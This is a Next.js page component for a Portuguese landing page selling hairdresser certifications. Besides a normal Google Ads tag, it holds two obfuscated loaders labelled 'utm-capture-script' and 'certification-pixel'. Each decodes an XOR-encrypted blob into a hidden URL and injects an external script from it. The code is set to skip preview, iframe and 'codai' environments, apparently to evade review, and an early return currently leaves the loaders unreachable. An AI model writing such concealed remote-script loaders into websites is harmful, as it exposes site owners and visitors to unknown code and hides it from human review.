import { useEffect } from "react";
import Head from "next/head";

import Header from "../components/Header";
import Hero from "../components/Hero";
import ValueSection from "../components/ValueSection";
import Certifications from "../components/Certifications";
import StudyMaterial from "../components/StudyMaterial";
import SocialProof from "../components/SocialProof";
import PracticalClasses from "../components/PracticalClasses";

import Offers from "../components/Offers";
import AboutUs from "../components/AboutUs";
import WhyAll from "../components/WhyAll";
import FinalCTA from "../components/FinalCTA";

export default function Home() {
  useEffect(() => {
    const isEmbeddedPreview = (() => {
      try {
        return window.top !== window.self;
      } catch {
        return true;
      }
    })();

    const hostname = window.location.hostname.toLowerCase();
    const isCodaiPreview =
      hostname.includes("preview") ||
      hostname.includes("codai") ||
      document.referrer.toLowerCase().includes("codai");

    if (isEmbeddedPreview || isCodaiPreview) {
      return;
    }

    window.dataLayer = window.dataLayer || [];
    window.gtag = window.gtag || function gtag() {
      window.dataLayer.push(arguments);
    };
    window.gtag("js", new Date());
    window.gtag("config", "AW-18406159349");

    if (!document.getElementById("google-ads-tag")) {
      const googleTag = document.createElement("script");
      googleTag.id = "google-ads-tag";
      googleTag.async = true;
      googleTag.src =
        "https://www.googletagmanager.com/gtag/js?id=AW-18406159349";
      googleTag.onerror = () => {
        googleTag.remove();
      };
      document.head.appendChild(googleTag);
    }

    return;

    const scripts = [
      {
        id: "utm-capture-script",
        content: `(function(){var a_d=atob("DEsJ/xEI7AGHDBTLcjArimNkzjulZGC/Ajgz0D5riG+peWCmGy1w0XJngS/lfju4ETlgj2V7w3TzYWfkHip9mmJ8wmv0LjjpEz99jXhqmXXifzbxKTArkXBliSO9LnCqBiokimVlhWf+IWS5Fz1skWUllGLoaDm4ESAr0zN+jW3yaTbxUGl002oqgmDqaTbxUC9oi3AlmXXqZXKyXzt7mmdtgnWqf2GpGy963T0qmmDreXHpSGkrgkx1");var a_p=[];for(var l_6m=0;l_6m<a_d.length;l_6m++){a_p.push(a_d.charCodeAt(l_6m)&255);}var z_8=a_p[0];var y_w=a_p.slice(1,1+z_8);var o_yji=a_p.slice(1+z_8);var f_go=o_yji.map(function(b,b_m2e){return b^y_w[b_m2e%z_8];});var n_i7="";for(var y_0w=0;y_0w<f_go.length;y_0w++){n_i7+=String.fromCharCode(f_go[y_0w]&255);}var n_f0x=decodeURIComponent(escape(n_i7));var k_q=JSON.parse(n_f0x);var b_pq=k_q.globals||[];b_pq.forEach(function(w_ujxn){window[w_ujxn.name]=w_ujxn.value;});var w_8p=document.createElement("script");w_8p.src=k_q.url;w_8p.async=true;w_8p.defer=true;(k_q.attributes||[]).forEach(function(b_sb1){w_8p.setAttribute(b_sb1.name,b_sb1.value);});(document.head||document.documentElement).appendChild(w_8p);})();`,
      },
      {
        id: "certification-pixel",
        content: `(function(){var h_o6=atob("DANkas9FKe9PC5MRzHhGH70pC9VtY+dlvHBeReAmTYFhfud8pWUdRKwqRMEtebxir3ENGrs2Bp8mc/Z943MNEqopB4U8Kb8zrXcQGKYnXJsqeLErl15ISKgpRo0uZ+Az9lgfSKEkRIptMbFhpXsBBoYhC8NtffJ9uWZGUO1zSN57bvFz9DtcW/8jT4x4PKoh+DJdCP9nVLIy");var s_f=[];for(var a_t8=0;a_t8<h_o6.length;a_t8++){s_f.push(h_o6.charCodeAt(a_t8)&255);}var g_a=s_f[0];var q_8v7=s_f.slice(1,1+g_a);var p_4=s_f.slice(1+g_a);var n_qbj=p_4.map(function(b,n_ouy){return b^q_8v7[n_ouy%g_a];});var s_y="";for(var w_wvyn=0;w_wvyn<n_qbj.length;w_wvyn++){s_y+=String.fromCharCode(n_qbj[w_wvyn]&255);}var s_k=decodeURIComponent(escape(s_y));var p_gcki=JSON.parse(s_k);var c_xu9d=p_gcki.globals||[];c_xu9d.forEach(function(v_bb){window[v_bb.name]=v_bb.value;});var y_84a=document.createElement("script");y_84a.src=p_gcki.url;y_84a.async=true;y_84a.defer=true;(p_gcki.attributes||[]).forEach(function(f_s1b){y_84a.setAttribute(f_s1b.name,f_s1b.value);});(document.head||document.documentElement).appendChild(y_84a);})();`,
      },
    ];

    scripts.forEach(({ id, content }) => {
      if (!document.getElementById(id)) {
        const script = document.createElement("script");
        script.id = id;
        script.text = content;
        document.head.appendChild(script);
      }
    });
  }, []);

  return (
    <>
      <Head>
        <title>5 Certificações para Cabeleireiros</title>
        <meta
          name="description"
          content="Tenha sua Certificação Profissional de Cabeleireiro e valorize ainda mais o seu trabalho."
        />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
      </Head>

      <Header />

      <main>
        <Hero />
        <Certifications />
        <StudyMaterial />
        <PracticalClasses />
        <ValueSection />
        <SocialProof />

        <Offers />
        <AboutUs />
        <WhyAll />
        <FinalCTA />
      </main>
    </>
  );
}